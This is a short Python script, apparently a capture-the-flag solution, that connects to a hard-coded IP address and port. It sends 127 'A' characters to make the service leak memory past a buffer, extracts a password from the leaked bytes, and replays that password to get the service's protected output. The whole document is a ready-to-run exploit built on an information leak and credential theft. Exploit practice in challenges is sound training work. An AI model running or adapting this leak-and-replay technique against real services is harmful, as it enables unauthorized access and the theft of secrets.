#!/usr/bin/env python3

import socket

host, port = "34.40.133.67", 7778

def talk(payload):
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(payload + b"\n")
    s.settimeout(5)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except TimeoutError:
        pass
    return out.decode(errors="replace")

leak = talk(b"A" * 127)
password = leak.split("A" * 127, 1)[1].splitlines()[0].encode()
print(talk(password))
